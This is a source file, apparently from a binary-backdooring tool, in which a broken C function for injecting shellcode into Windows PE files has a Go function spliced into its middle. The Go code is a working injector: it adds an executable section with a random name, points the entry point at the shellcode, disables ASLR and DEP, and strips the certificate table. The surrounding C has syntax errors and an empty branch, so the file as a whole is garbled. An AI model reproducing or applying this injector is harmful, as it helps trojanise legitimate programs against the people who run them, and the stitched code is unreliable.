int binject_PE(char *file,char *shellcode,int method)
{
uint32_t size;
  FILE *f;
  f=fopen(file,"r");
  fseek(f,0,SEEK_END);
 size=ftell(f);
  char *file_buffer = calloc(1,size);
	int sclen=strlen(shellcode);
   PeBinject - Inject shellcode into an PE binary
func PeBinject(sourceBytes []byte, shellcodeBytes []byte, config *BinjectConfig) ([]byte, error) {
	var entryPoint, sectionAlignment, fileAlignment, scAddr uint32
	var imageBase uint64
	var shellcode []byte
	lastSection := peFile.Sections[peFile.NumberOfSections-1]

	switch (peFile.OptionalHeader).(type) {
	case *pe.OptionalHeader32:
		imageBase = uint64(hdr.ImageBase) // cast this back to a uint32 before use in 32bit
		entryPoint = hdr.AddressOfEntryPoint
		sectionAlignment = hdr.SectionAlignment
		fileAlignment = hdr.FileAlignment
		scAddr = align(lastSection.Size, fileAlignment, lastSection.Offset) //PointerToRawData
		shellcode = api.ApplySuffixJmpIntel32(shellcodeBytes, scAddr, entryPoint+uint32(imageBase), binary.LittleEndian)
		break
	case *pe.OptionalHeader64:
		imageBase = hdr.ImageBase
		entryPoint = hdr.AddressOfEntryPoint
		sectionAlignment = hdr.SectionAlignment
		fileAlignment = hdr.FileAlignment
		scAddr = align(lastSection.Size, fileAlignment, lastSection.Offset) //PointerToRawData
		shellcode = api.ApplySuffixJmpIntel32(shellcodeBytes, scAddr, entryPoint+uint32(imageBase), binary.LittleEndian)
		break
	}

	/*
		// Code Cave Method
		shellcodeLen := len(shellcodeBytes) + 5 // 5 bytes get added later by AppendSuffixJmp
		for _, section := range peFile.Sections {
			flags := section.Characteristics
			if flags&pe.IMAGE_SCN_MEM_EXECUTE != 0 { // todo: should we do the TLS section or other non-X sections?
				// this section is executable
				data, err := section.Data()
				if err != nil {
					return nil, err
				}
				caves, err := FindCaves(data)
				if err != nil {
					return nil, err
				}
				for _, cave := range caves {
					if cave.End <= uint64(section.Size) && cave.End-cave.Start >= uint64(shellcodeLen) {
						scAddr := section.Offset + uint32(cave.Start)
						shellcode := api.ApplySuffixJmpIntel64(shellcodeBytes, uint32(scAddr), uint32(entryPoint), binary.LittleEndian)
						peFile.InsertionAddr = scAddr
						peFile.InsertionBytes = shellcode
						return peFile.Bytes()
					}
				}
			}
		}
	*/
	// Add a New Section Method (most common)
	shellcodeLen := len(shellcode)
	newsection := new(pe.Section)
	newsection.Name = "." + RandomString(5)
	o := []byte(newsection.Name)
	newsection.OriginalName = [8]byte{o[0], o[1], o[2], o[3], o[4], o[5], 0, 0}
	newsection.VirtualSize = uint32(shellcodeLen)
	newsection.VirtualAddress = align(lastSection.VirtualSize, sectionAlignment, lastSection.VirtualAddress)
	newsection.Size = align(uint32(shellcodeLen), fileAlignment, 0)                //SizeOfRawData
	newsection.Offset = align(lastSection.Size, fileAlignment, lastSection.Offset) //PointerToRawData
	newsection.Characteristics = pe.IMAGE_SCN_CNT_CODE | pe.IMAGE_SCN_MEM_EXECUTE | pe.IMAGE_SCN_MEM_READ

	peFile.InsertionAddr = scAddr
	peFile.InsertionBytes = shellcode

	switch hdr := (peFile.OptionalHeader).(type) {
	case *pe.OptionalHeader32:
		v := newsection.VirtualSize
		if v == 0 {
			v = newsection.Size // SizeOfRawData
		}
		hdr.SizeOfImage = align(v, sectionAlignment, newsection.VirtualAddress)
		hdr.AddressOfEntryPoint = newsection.VirtualAddress
		hdr.CheckSum = 0
		// disable ASLR
		hdr.DllCharacteristics ^= pe.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
		hdr.DataDirectory[5].VirtualAddress = 0
		hdr.DataDirectory[5].Size = 0
		peFile.FileHeader.Characteristics |= pe.IMAGE_FILE_RELOCS_STRIPPED
		//disable DEP
		hdr.DllCharacteristics ^= pe.IMAGE_DLLCHARACTERISTICS_NX_COMPAT
		// zero out cert table offset and size
		hdr.DataDirectory[4].VirtualAddress = 0
		hdr.DataDirectory[4].Size = 0
		break
	case *pe.OptionalHeader64:
		v := newsection.VirtualSize
		if v == 0 {
			v = newsection.Size // SizeOfRawData
		}
		hdr.SizeOfImage = align(v, sectionAlignment, newsection.VirtualAddress)
		hdr.AddressOfEntryPoint = newsection.VirtualAddress
		hdr.CheckSum = 0
		// disable ASLR
		hdr.DllCharacteristics ^= pe.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
		hdr.DataDirectory[5].VirtualAddress = 0
		hdr.DataDirectory[5].Size = 0
		peFile.FileHeader.Characteristics |= pe.IMAGE_FILE_RELOCS_STRIPPED
		//disable DEP
		hdr.DllCharacteristics ^= pe.IMAGE_DLLCHARACTERISTICS_NX_COMPAT
		// zero out cert table offset and size
		hdr.DataDirectory[4].VirtualAddress = 0
		hdr.DataDirectory[4].Size = 0
		break
	}

	peFile.FileHeader.NumberOfSections++
	peFile.Sections = append(peFile.Sections, newsection)

	return peFile.Bytes()
}
}
  if(method==CODE_CAVE)
  {
   for(i=0;i<sections;i++)
  {
       x=find_code_cave(strlen(shellcode,section_start,section_end,file_buffer);
                        if(x!=0)
                        break;
  }
  } 
  if(method==NEW_SECTION)
  {
  
    
    
    
    
    
  }
  free(file_buffer);  
}
